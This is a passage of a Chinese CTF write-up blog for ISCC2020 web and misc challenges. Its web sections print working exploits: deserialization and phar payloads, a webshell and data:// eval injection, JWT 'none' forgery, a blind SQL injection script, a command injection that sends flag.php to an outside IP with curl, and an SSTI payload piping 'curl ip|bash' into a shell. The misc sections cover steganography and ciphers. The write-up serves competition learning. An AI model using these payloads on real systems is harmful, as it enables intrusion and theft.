unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    $url=<span class="string">&#x27;./index.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$html=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    $s = $_POST[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    $html.=<span class="string">&quot;&lt;p&gt;è°¢è°¢å‚ä¸Ž!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>扫目录发现flag.php,很简单的一道反序列化，exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> baby;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//101.201.126.95:7003/?data=O:4:%22baby%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</span></span><br></pre></td></tr></table></figure><p>base64解码即可</p><h4 id="What-can-images-do"><a href="#What-can-images-do" class="headerlink" title="What can images do"></a>What can images do</h4><p>文件上传题，发现图片示例那里可以包含，直接图片马</p><p>上传图片马</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200506220940.png" style="zoom:80%;"><p>包含图片马</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200506221214.png" style="zoom:80%;"><p>蚁剑连，在flag.php看到flag</p><h4 id="未知的风险-1"><a href="#未知的风险-1" class="headerlink" title="未知的风险-1"></a>未知的风险-1</h4><p>jwt题目，提示密码是flag{*}形式，但是这题不用破解，直接把加密算法修改成none就行，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt </span><br><span class="line">print(jwt.encode(&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;user&quot;</span>,<span class="string">&quot;iat&quot;</span>:<span class="number">1588775401</span>,<span class="string">&quot;jti&quot;</span>:<span class="string">&quot;b0b6f6e4fb94a81390aa7cca9ed7f773&quot;</span>&#125;,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200506224334.png" style="zoom:80%;"><p>成功替换发现是xxe，直接读flag.php</p><p><img src="/2020/05/06/ISCC2020-writeup/TIM%E6%88%AA%E5%9B%BE20200506225419.png"></p><h4 id="Where-is-file"><a href="#Where-is-file" class="headerlink" title="Where is file?"></a>Where is file?</h4><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($file, <span class="string">&quot;file://&quot;</span>)) &#123;</span><br><span class="line">    $file=str_replace(<span class="string">&quot;file://&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接包含<code>data://</code>协议getshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> eval($_POST[1]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>flag在flag.php里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;web_include_file&#125;</span><br></pre></td></tr></table></figure><h4 id="阿森的爱情-2"><a href="#阿森的爱情-2" class="headerlink" title="阿森的爱情-2"></a>阿森的爱情-2</h4><p>sql注入，fuzz一下，发现过滤的并不多，但把经常用的<code>()</code>过滤了，并且过滤了<code>password</code>，order by判断有三列，且第二位为回显位</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200508154213.png" style="zoom: 80%;"><p>之前没做过过滤括号的题，搜了搜，发现可以用<code>order by</code>比较注入</p><p>先说一下<code>order by</code>，我们都知道order by 可以判断查询的列数，为啥呢？</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200508154721.png" style="zoom:80%;"><p>我们在查询的时候，order by 的作用是对某列进行排序，并且是以ASCII码的顺序来的</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200508155539.png" style="zoom: 80%;"><p>如果列数超过查询的列数自然会报错</p><p>那么如何进行<code>order by</code>比较注入呢？</p><p>就这道题而言，我们可以猜测，password在第三列，并且只有一条数据，这样的话我们就可以按照</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200508161743.png" style="zoom:80%;"><p>进行比较注入，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s=string.digits+string.ascii_lowercase</span><br><span class="line">url=<span class="string">&#x27;http://101.201.126.95:7006/&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">f=flag</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&#x27; union select 1,1433223,&#x27;&#123;&#125;&#x27; order by 3#&quot;</span>.format(flag+i),</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;aaa&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">flag=flag+s[s.index(i)<span class="number">-1</span>]</span><br><span class="line">print(s[s.index(i)<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> flag==f:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># bfe42ac26e273ef3a859a651e0a02df0</span></span><br></pre></td></tr></table></figure><p>不知道为啥最后一个<code>0</code>跑了好几次才出来，一直凑不够32位,解MD5得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;iloveishuai&#125;</span><br></pre></td></tr></table></figure><h4 id="阿帅的爱情"><a href="#阿帅的爱情" class="headerlink" title="阿帅的爱情"></a>阿帅的爱情</h4><p>访问得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&quot;ip&quot;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $ip=$_GET[<span class="string">&quot;ip&quot;</span>];</span><br><span class="line">    $pattern=<span class="string">&quot;/[;|&amp;].*[a-zA-Z]+/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($pattern,$ip)!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bad domain&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $result = shell_exec(<span class="string">&#x27;ping -c 4 &#x27;</span> . $ip);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">        $result = $e-&gt;getMessage();</span><br><span class="line">        <span class="keyword">echo</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">    $result = str_replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&lt;br&gt;&quot;</span>, $result);</span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接构造payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=`curl 47.97.210.141:9000/?$(tail -n 2 flag.php)`</span><br></pre></td></tr></table></figure><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="ISCC签到"><a href="#ISCC签到" class="headerlink" title="ISCC签到"></a>ISCC签到</h4><p>直接改下高度就能看到</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200506231349.png" style="zoom: 80%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;D3tivtm_zv_Tq5I_Dygef&#125;</span><br></pre></td></tr></table></figure><p>提交发现不对，猜测是某种编码，最终发现是凯撒密码变种,看下这个脚本吧，去掉数字和下划线，发现有规律</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s1=<span class="string">&#x27;D3tivtm_zv_Tq5I_Dygef&#x27;</span></span><br><span class="line">s2=<span class="string">&#x27;W3lcome_to_Mi5C_Wryyy&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(s1,s2):</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;0123456789_&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> ord(i)-ord(j)&lt;<span class="number">0</span>:</span><br><span class="line">print(i+<span class="string">&#x27; &#x27;</span>+j+<span class="string">&#x27; &#x27;</span>+str(<span class="number">26</span>-ord(j)+ord(i)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(i+<span class="string">&#x27; &#x27;</span>+j+<span class="string">&#x27; &#x27;</span>+str(ord(i)-ord(j)))</span><br><span class="line"><span class="comment"># 7867循环</span></span><br></pre></td></tr></table></figure><p>最终flag，前面的很像<code>welcome to</code>，实在不行猜也行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;W3lcome_to_Mi5C_Wryyy&#125;</span><br></pre></td></tr></table></figure><h4 id="寻找小明-1"><a href="#寻找小明-1" class="headerlink" title="寻找小明-1"></a>寻找小明-1</h4><p>根据<code>最低位的背影.png</code>立马想到了lsb隐写相关的，StegSlove打开，切换不同通道，发现一张二维码</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200507103110.png" style="zoom:80%;"><p>扫出来一个链接，打开发现是</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200507103220.png" style="zoom:80%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">257</span>,<span class="number">1</span>,<span class="number">258</span>,<span class="number">2</span>,<span class="number">259</span>,<span class="number">3</span>,<span class="number">260</span>,<span class="number">4</span>,<span class="number">261</span>,<span class="number">5</span>,<span class="number">262</span>,<span class="number">7</span>,<span class="number">263</span>,<span class="number">8</span>,<span class="number">259</span>,<span class="number">277</span>,<span class="number">438</span>,<span class="number">300</span>,<span class="number">455</span>,<span class="number">319</span>,<span class="number">25</span>,<span class="number">300</span>,<span class="number">456</span>,<span class="number">400</span>,<span class="number">66</span>,<span class="number">366</span>,<span class="number">78</span>,<span class="number">300</span>,<span class="number">421</span>,<span class="number">259</span>,<span class="number">452</span>,<span class="number">23</span>]</span><br></pre></td></tr></table></figure><p>这是啥呢？</p><p>最终flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ISCC*funny&#125;</span><br></pre></td></tr></table></figure><h4 id="ISCC成绩查询-1"><a href="#ISCC成绩查询-1" class="headerlink" title="ISCC成绩查询-1"></a>ISCC成绩查询-1</h4><p>StegSlove打开，发现藏着</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200507123235.png" style="zoom:80%;"><p>沿着路径走得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRLNCHHAFCIEEIEEPR</span><br></pre></td></tr></table></figure><p>栅栏密码解密得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;THERAILFENCECIPHER&#125;</span><br></pre></td></tr></table></figure><h4 id="神秘组织的邮件-1"><a href="#神秘组织的邮件-1" class="headerlink" title="神秘组织的邮件-1"></a>神秘组织的邮件-1</h4><p>StegSlove打开，发现有</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">雄机富魁</span><br><span class="line">雄罡孤捷 勇立雄英</span><br><span class="line">贵猛猛勇</span><br></pre></td></tr></table></figure><p>发现每个汉字对应36天罡72地煞，试了试发现都是天罡,换成对应的顺序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">雄机富魁    天：6 3 11 1</span><br><span class="line"></span><br><span class="line">雄罡孤捷天：6 2 13 16</span><br><span class="line"></span><br><span class="line">勇立雄英天：5 15 6 9</span><br><span class="line"></span><br><span class="line">贵猛猛勇天：10 7 7 5</span><br></pre></td></tr></table></figure><p>发现最大数16，最小数为1，想到16进制，所有数减1，转换成16进制，转换成UTF-16</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">雄机富魁    天：6 3 11 152a0</span><br><span class="line"></span><br><span class="line">雄罡孤捷天：6 2 13 1651cf</span><br><span class="line"></span><br><span class="line">勇立雄英天：5 15 6 94e58</span><br><span class="line"></span><br><span class="line">贵猛猛勇天：10 7 7 59664</span><br><span class="line"></span><br><span class="line">\u52a0\u51cf\u4e58\u9664</span><br></pre></td></tr></table></figure><p>UTF-16转换地址：<a href="http://www.msxindl.com/tools/unicode16.asp">http://www.msxindl.com/tools/unicode16.asp</a></p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200507144230.png" style="zoom: 80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;加减乘除&#125;</span><br></pre></td></tr></table></figure><h4 id="耳听为实"><a href="#耳听为实" class="headerlink" title="耳听为实"></a>耳听为实</h4><p>查看属性发现副标题是flag,猜测MP3Stego隐写，密码试试flag，得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag is here！</span><br><span class="line">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1L3cq1CRVhvv6mq8qogq-sA</span><br><span class="line">dHc0aQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64解密得到提取码，下载下来，发现比原来的大，binwalk分离出压缩包，解压得到</p><p><code>flag-RD.wav</code>和<code>ctf-produce.py</code></p><p><strong>ctf-produce.py:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取音频信号</span></span><br><span class="line">f = wave.open(os.path.abspath(<span class="string">&#x27;./flag.wav&#x27;</span>), <span class="string">&#x27;rb&#x27;</span>) <span class="comment"># 二进制只读模式，打开音频文件</span></span><br><span class="line">params = f.getparams() <span class="comment"># 返回音频参数，元组：声道数，量化位数(byte单位)，采样频率，采样点数，压缩类型，压缩类型的描述</span></span><br><span class="line">nchannels, sampwidth, framerate, nframes=params[:<span class="number">4</span>] <span class="comment"># 赋值声道数，量化位数，采样频率，采样点数</span></span><br><span class="line">str = f.readframes(nframes) <span class="comment"># 读取采样点数据，字符串类型</span></span><br><span class="line">wave_data = np.fromstring(str, dtype=np.short) <span class="comment"># 字符串转换为short类型</span></span><br><span class="line">time = np.arange(<span class="number">0</span>, nframes) * (<span class="number">1.0</span> / framerate) <span class="comment"># 通过采样点数和取样频率计算出每个取样的时间</span></span><br><span class="line"><span class="comment"># 语音信号分帧处理</span></span><br><span class="line">wlen = <span class="number">100</span> <span class="comment"># 帧长</span></span><br><span class="line">inc = <span class="number">50</span> <span class="comment"># 帧移</span></span><br><span class="line">signal_length = len(wave_data) <span class="comment"># 信号总长度</span></span><br><span class="line"><span class="keyword">if</span> signal_length &lt;= wlen: <span class="comment"># 若信号长度小于一个帧的长度，则帧数 nf 定义为1，否则，计算帧的总长度</span></span><br><span class="line">    nf = <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    nf = int(np.ceil((<span class="number">1.0</span>*signal_length-wlen+inc)/inc))</span><br><span class="line">pad_length = int((nf<span class="number">-1</span>)*inc+wlen) <span class="comment"># 所有帧加起来总的铺平后的长度</span></span><br><span class="line">zeros = np.zeros((pad_length-signal_length), dtype=int) <span class="comment"># 不够的长度使用0填补</span></span><br><span class="line">pad_signal = np.concatenate((wave_data,zeros)) <span class="comment"># 填补后的信号记为pad_signal</span></span><br><span class="line">indices = np.tile(np.arange(<span class="number">0</span>,wlen),(nf,<span class="number">1</span>))+np.tile(np.arange(<span class="number">0</span>,nf*inc,inc), (wlen,<span class="number">1</span>)).T  <span class="comment"># 相当于对所有帧的时间点进行抽取，得到nf*wlen长度的矩阵</span></span><br><span class="line">indices = np.array(indices, dtype=np.int32) <span class="comment"># 将indices转化为矩阵</span></span><br><span class="line">indices = np.random.permutation(indices)</span><br><span class="line">frames = pad_signal[indices] <span class="comment"># 得到帧信号</span></span><br><span class="line">frames = frames.flatten()</span><br><span class="line">w = wave.open(os.path.abspath(<span class="string">&#x27;./flag-RD.wav&#x27;</span>), <span class="string">&quot;wb&quot;</span>) <span class="comment"># 打开WAV文档</span></span><br><span class="line"><span class="comment"># 配置声道数、量化位数和取样频率</span></span><br><span class="line">w.setnchannels(nchannels)</span><br><span class="line">w.setsampwidth(sampwidth)</span><br><span class="line">w.setframerate(framerate*<span class="number">2</span>) <span class="comment"># 采样频率至少是信号频率最高频率的两倍以上才能重新恢复为原来的模拟信号</span></span><br><span class="line">w.writeframes(frames.tostring()) <span class="comment"># 将wav_data转换为二进制数据写入文件</span></span><br><span class="line">w.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>很明显，需要我们逆推flag.wav了</p><h4 id="千层套路"><a href="#千层套路" class="headerlink" title="千层套路"></a>千层套路</h4><p>一张gif图片，stegslove分离出8张图片，ps拼一下</p><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200516122622.png" style="zoom:67%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sr5#TKh~ck3^</span><br></pre></td></tr></table></figure><p>提交flag发现不对</p><h2 id="擂台题"><a href="#擂台题" class="headerlink" title="擂台题"></a>擂台题</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="Easy-Injection"><a href="#Easy-Injection" class="headerlink" title="Easy Injection"></a>Easy Injection</h4><p>flask ssti，直接P神的payload反弹shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;curl ip|bash&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><img src="/2020/05/06/ISCC2020-writeup/TIM截图20200507151744.png" style="zoom:80%;"><p>root权限就很奇怪</p><h4 id="大黑阔"><a href="#大黑阔" class="headerlink" title="大黑阔"></a>大黑阔</h4><p>扫目录，发现有源码<a href="http://www.zip/">www.zip</a></p><p>upload.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$tmp_file_location=<span class="string">&#x27;/var/www/html/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists($tmp_file_location.<span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      $tmp_file_location.<span class="string">&quot;upload_file/&quot;</span> .$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> .$tmp_file_location. <span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>show.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure><p>很明显phar反序列化，由于版本是php5.6，可以用assert，所以构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;assert($_POST[1]);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;shell.phar&quot;</span>); <span 